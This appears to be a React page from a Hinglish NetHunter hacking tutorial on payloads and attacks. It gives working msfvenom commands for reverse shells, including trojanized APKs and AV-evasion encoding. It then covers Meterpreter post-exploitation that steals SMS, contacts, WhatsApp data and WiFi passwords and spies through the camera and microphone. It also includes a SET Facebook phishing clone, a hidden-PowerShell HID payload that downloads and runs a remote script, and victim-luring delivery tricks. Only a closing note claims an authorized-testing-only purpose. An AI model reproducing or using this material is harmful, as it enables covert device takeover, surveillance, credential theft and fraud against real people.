import TutorialLayout from '../components/TutorialLayout'
import CodeBlock from '../components/CodeBlock'

export default function Payloads() {
  return (
    <TutorialLayout
      title="Payloads & Attacks"
      subtitle="Nethunter par payloads aur attack frameworks seekhein"
      icon="💣"
      prev={{ to: '/bluetooth', label: 'Bluetooth Hacking' }}
      next={{ to: '/tools', label: 'Tools Reference' }}
    >
      <h2>Payload Kya Hota Hai?</h2>
      <p>
        Payload ek aisa code hota hai jo target system par execute hota hai jab koi vulnerability successfully exploit ho jaati hai. Simple bhasha mein samjhein — agar aapne kisi system mein ek "door" (vulnerability) dhundh li, toh payload woh "cheez" hai jo aap us door se andar bhejte hain. Penetration testing mein payloads ka use yeh prove karne ke liye hota hai ki vulnerability real hai aur actually kaam karti hai.
      </p>
      <p>
        Payload generally do kaam karta hai — ya toh target se attacker ki machine par ek connection banata hai (reverse shell) ya phir target par ek port open karta hai jisse attacker connect kar sake (bind shell). Reverse shell zyada popular hai kyunki firewalls mein incoming connections block hoti hain lekin outgoing connections allow hoti hain.
      </p>
      <p>
        Nethunter par payloads banana bahut aasan hai Metasploit Framework ki wajah se. Metasploit ke msfvenom tool se aap ek command mein Android, Windows, Linux, ya PHP ke payloads generate kar sakte hain. Yeh sab Nethunter mein pre-installed hota hai.
      </p>

      <div className="info-box mb-6">
        <strong>💡 Payload ke Types:</strong>
        <ul className="mt-2">
          <li><strong>Singles (Inline):</strong> Self-contained payloads jo ek hi file mein sab kuch karte hain. Chhote hain lekin limited functionality hoti hai. Example: simple reverse shell.</li>
          <li><strong>Stagers:</strong> Chhote payloads jo pehle ek connection establish karte hain attacker se. Inka kaam hai stage ko lana — yeh bahut chhote hote hain taaki easily deliver ho sakein.</li>
          <li><strong>Stages:</strong> Bade payloads jo stager ke through aate hain connection establish hone ke baad. Meterpreter sabse popular stage hai — bahut powerful hai aur bahut saare features deta hai.</li>
        </ul>
      </div>

      <h2>Metasploit Framework — Kya Hai aur Kaise Chalega</h2>
      <p>
        Metasploit duniya ka sabse popular penetration testing framework hai. Rapid7 ke dwara maintain kiya jaata hai aur open-source hai. Metasploit mein 2000+ exploits, 500+ payloads, aur bahut saare auxiliary modules hain. Nethunter par Metasploit pre-installed aata hai — aapko bas database setup karna hota hai.
      </p>
      <p>
        Metasploit ke saath kaam karne ke liye pehle PostgreSQL database start karna padta hai. Database isliye zaroori hai taaki aap scan results, credentials, aur loot ko organize kar sakein. Bina database ke Metasploit kaam karega lekin aap results save nahi kar payenge.
      </p>

      <h3>Metasploit Kaise Start Karein</h3>
      <CodeBlock
        title="Metasploit Launch Karein"
        code={`# PostgreSQL database start karein (Metasploit ke liye zaroori hai):
sudo systemctl start postgresql

# Agar systemctl kaam na kare (Nethunter mein):
sudo service postgresql start

# Database initialize karein:
sudo msfdb init

# Ab Metasploit console start karein:
sudo msfconsole

# Database connected hai ya nahi check karein:
msf6 > db_status
# "[*] Connected to msf. Connection type: postgresql." dikhna chahiye

# Agar database connected nahi hai:
msf6 > db_connect -y /usr/share/metasploit-framework/config/database.yml

# Metasploit ke kuch basic commands:
msf6 > help           # Sab commands ki list
msf6 > search android  # Android exploits search karein
msf6 > show payloads   # Sab payloads dekhein
msf6 > show exploits   # Sab exploits dekhein`}
      />

      <h3>msfvenom se Payloads Generate Karein</h3>
      <p>
        msfvenom Metasploit ka payload generation tool hai. Isse aap ek command mein kisi bhi platform ke liye payload bana sakte hain — Android, Windows, Linux, macOS, PHP, Python, aur bahut saare. msfvenom payloads ko encode bhi kar sakta hai taaki basic antivirus detection se bachein.
      </p>

      <CodeBlock
        title="Android Payload Banayein"
        code={`# Android reverse TCP payload generate karein:
msfvenom -p android/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -o payload.apk

# Options samjhein:
# -p       = Payload type (android/meterpreter/reverse_tcp)
# LHOST    = Aapka IP address (attacker machine)
# LPORT    = Port number (listener ke liye)
# -o       = Output file name

# Payload ko legitimate APK mein bind karein (trojanize):
msfvenom -p android/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 \\
  -x original_app.apk -o trojanized_app.apk

# -x = Original APK file jismein payload bind karna hai
# Jab victim yeh APK install karega toh payload background mein chalega
# Aur original app bhi normally kaam karega

# Apna IP address kaise pata karein:
# WiFi network par: ifconfig wlan0
# Ya: ip addr show wlan0`}
      />

      <CodeBlock
        title="Other Platform Payloads"
        code={`# Linux reverse shell payload:
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf > shell.elf
# -f elf = ELF format (Linux executable)

# Windows reverse shell payload:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe > shell.exe
# -f exe = EXE format (Windows executable)

# PHP web shell (web server par upload karne ke liye):
msfvenom -p php/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f raw > shell.php

# Python reverse shell:
msfvenom -p python/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f raw > shell.py

# Bash reverse shell (Linux ke liye, bahut simple):
msfvenom -p cmd/unix/reverse_bash LHOST=YOUR_IP LPORT=4444 -f raw > shell.sh

# Encoded payload (AV evasion ke liye):
msfvenom -p android/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -e x86/shikata_ga_nai -i 5 -o encoded_payload.apk
# -e = Encoder type
# -i 5 = 5 baar encode karega (zyada encoding = zyada evasion)`}
      />

      <h3>Listener Setup Karein (Multi Handler)</h3>
      <p>
        Payload generate karne ke baad aapko ek listener setup karna hota hai jo incoming connections ko handle kare. Jab target payload run karega toh woh aapke listener se connect hoga aur aapko ek Meterpreter session milega — jisse aap target ko control kar sakte hain.
      </p>

      <CodeBlock
        title="Metasploit Multi Handler Setup"
        code={`# msfconsole mein:
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST YOUR_IP
set LPORT 4444
exploit

# Listener ab wait karega incoming connection ke liye
# Jab target payload chalayega toh yeh dikhega:
# [*] Meterpreter session 1 opened (YOUR_IP:4444 -> TARGET_IP:xxxxx)

# Ab aap Meterpreter session mein hain!
# Yeh bahut powerful commands hain:

# Target ki information:
meterpreter > sysinfo

# System ka shell lo:
meterpreter > shell

# Files download karein target se:
meterpreter > download /sdcard/photos/secret.jpg

# Files upload karein target par:
meterpreter > upload virus.apk /sdcard/

# Screenshot lo:
meterpreter > screenshot

# Camera se photo lo (front camera):
meterpreter > webcam_snap

# Microphone se audio record karein:
meterpreter > record_mic -d 10

# Phone ke contacts nikalein:
meterpreter > dump_contacts

# SMS messages nikalein:
meterpreter > dump_sms

# Call logs nikalein:
meterpreter > dump_calllog

# SMS bhejein target phone se:
meterpreter > send_sms -d +911234567890 -m "Hello from target!"

# Keylogger start karein:
meterpreter > keyscan_start
meterpreter > keyscan_dump

# GPS location pata karein:
meterpreter > wlan_geolocate`}
      />

      <h2>Social Engineering Toolkit (SET)</h2>
      <p>
        Social Engineering Toolkit ek powerful framework hai social engineering attacks ke liye. Social engineering ka matlab hai logon ko manipulate karke unse confidential information nikalna ya unhe kuch karne ke liye convince karna — jaise fake login page par credentials enter karna ya malicious file download karna. SET bahut se attack types support karta hai.
      </p>

      <CodeBlock
        title="SET Launch Karein"
        code={`# Social Engineering Toolkit start karein:
sudo setoolkit

# Main menu options:
# 1) Social-Engineering Attacks
# 2) Penetration Testing (Fast-Track)
# 3) Third Party Modules
# 4) Update the Social-Engineer Toolkit
# 5) Update SET configuration`}
      />

      <CodeBlock
        title="Credential Harvesting Attack (Phishing)"
        code={`# SET mein:
# 1) Social-Engineering Attacks select karein
# 2) Website Attack Vectors select karein
# 3) Credential Harvester Attack select karein
# 4) Site Cloner select karein

# Apna IP address daalein (phishing server ke liye):
# SET: Enter the IP address for the POST back: YOUR_IP

# Clone karna hai website ka URL daalein:
# SET: Enter the url to clone: https://www.facebook.com

# SET ek clone banayega original Facebook jaisa
# Jab victim aapke link par jaayega toh usse Facebook jaisa page dikhega
# Aur jab woh login karega toh credentials aapke terminal mein dikhenge!

# Link share karein target ke saath: http://YOUR_IP
# Jab victim login karega toh aapko username aur password mil jayega

# Isse samjhein ki phishing kaise kaam karta hai
# Aur khud ko protect karein — hamesha URL check karein!`}
      />

      <h2>HID Attacks (BadUSB / Keystroke Injection)</h2>
      <p>
        HID (Human Interface Device) attack mein aapka phone ek USB keyboard ka kaam karta hai. Jab aap phone ko OTG cable se computer se connect karte hain, toh computer aapke phone ko ek keyboard samajhta hai. Ab aap automatically keystrokes bhej sakte hain — jaise koi tezi type kar raha ho. Yeh attack bahut fast hai aur victim ko pata bhi nahi chalta kya ho raha hai.
      </p>
      <p>
        Iske liye aap Ducky Script use karte hain — yeh USB Rubber Ducky ke jaisa scripting language hai. Aap script likh sakte hain jo keystrokes bhejegi — jaise command prompt khulna, commands type karna, files download karna, ya backdoor install karna.
      </p>

      <CodeBlock
        title="HID Attack Setup Karein"
        code={`# Phone ko OTG cable se target computer se connect karein
# Nethunter automatically USB HID device ki tarah kaam karega

# Ducky Script banayein (USB Rubber Ducky syntax):
cat > payload.txt << 'EOF'
DELAY 1000
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 1000
STRING echo Hacked! > C:\\hacked.txt
ENTER
EOF

# Script ka matlab:
# DELAY 1000 = 1 second wait karein
# GUI r = Windows key + R dabayein (Run dialog khulega)
# STRING cmd = "cmd" type karein
# ENTER = Enter dabayein
# STRING echo... = Command type karein

# Nethunter App mein:
# 1. HID Attacks section mein jaayein
# 2. "HID PowerSploit" ya custom payload select karein
# 3. Apna Ducky Script load karein
# 4. Execute button dabayein
# 5. Target computer par commands automatically type ho jayenge`}
      />

      <CodeBlock
        title="Advanced HID Attack — Reverse Shell"
        code={`# Target computer par reverse shell establish karein:
cat > reverse_shell.txt << 'EOF'
DELAY 2000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell.ps1')"
ENTER
EOF

# Yeh target computer par hidden PowerShell window mein
# aapke server se ek script download aur execute karega
# Aur aapko reverse shell milega

# Listener setup karein (apne server par):
sudo msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST YOUR_IP
set LPORT 4444
exploit`}
      />

      <h2>Payload Delivery Methods</h2>
      <p>
        Payload banana aadha kaam hai — usse target tak pahunchana bhi utna hi zaroori hai. Different delivery methods alag alag scenarios mein kaam karte hain:
      </p>
      <div className="space-y-4">
        <div className="glass-card p-4">
          <h4 className="text-neon-cyan font-bold">📱 APK Binding (Android)</h4>
          <p className="text-gray-400 text-sm mt-1">
            Apne payload ko kisi legitimate app (WhatsApp mod, game, tool) ke saath bind karein. Jab victim app install karega toh payload background mein chalega aur original app bhi normally kaam karega. Victim ko kuch suspicious nahi lagega. Social media ya messaging apps ke through distribute karein.
          </p>
        </div>
        <div className="glass-card p-4">
          <h4 className="text-neon-cyan font-bold">🌐 Phishing Website</h4>
          <p className="text-gray-400 text-sm mt-1">
            Fake login page banayein jo bilkul asli jaisa dikhta ho (Facebook, Instagram, Google). Jab victim credentials enter kare toh aapko mil jaayein. SET (Social Engineering Toolkit) se aasani se ban jaata hai. Email ya SMS mein link bhejein.
          </p>
        </div>
        <div className="glass-card p-4">
          <h4 className="text-neon-cyan font-bold">🔌 USB Drop Attack</h4>
          <p className="text-gray-400 text-sm mt-1">
            USB drive par autorun payload daalke kisi public place (office, library, parking) mein chhod dein. Curiosity se koi na koi USB apne computer mein lagayega. Kuch log USB mein interesting naam rakhte hain jaise "Salary_2024.xlsx.exe" taaki curiosity badhe.
          </p>
        </div>
        <div className="glass-card p-4">
          <h4 className="text-neon-cyan font-bold">📧 Email Attachments</h4>
          <p className="text-gray-400 text-sm mt-1">
            Payload ko document (.doc, .pdf, .xls) ki tarah disguise karein. Macro-enabled documents mein payload hota hai jo enable karne par execute hota hai. Ya phir .exe file ko .pdf ki icon dekar bhejein.
          </p>
        </div>
      </div>

      <h2>Android Ke Liye Khaas Payload Techniques</h2>

      <CodeBlock
        title="Android Meterpreter Post-Exploitation"
        code={`# Jab Meterpreter session mil jaaye Android par:

# Phone ki poori info:
meterpreter > sysinfo

# Installed apps ki list:
meterpreter > app_list

# App install karein remotely:
meterpreter > app_install /path/to/app.apk

# App uninstall karein:
meterpreter > app_uninstall com.target.app

# Permissions check karein:
meterpreter > dump_permissions

# SMS bhejein victim ke phone se:
meterpreter > send_sms -d +919876543210 -m "Bank alert: click here..."

# Call logs dump karein:
meterpreter > dump_calllog
# CSV format mein save hoga

# Contacts dump karein:
meterpreter > dump_contacts
# Sab contacts mil jayenge

# WhatsApp ya other apps ka data:
# (Rooted phone par):
meterpreter > shell
su
cd /data/data/com.whatsapp/databases/
# msgstore.db file download karein

# WiFi passwords nikalein (rooted):
meterpreter > shell
su
cat /data/misc/wifi/WifiConfigStore.xml`}
      />

      <div className="warning-box mt-8">
        <strong>⚠️ Yaad Rakhein:</strong> Yeh sab techniques sirf authorized penetration testing ke liye hain. Bina permission ke inka use karna illegal hai aur serious legal consequences ho sakte hain. Hamesha written permission lein testing se pehle. Responsible disclosure follow karein — agar koi vulnerability mile toh company ko inform karein public karne se pehle.
      </div>
    </TutorialLayout>
  )
}
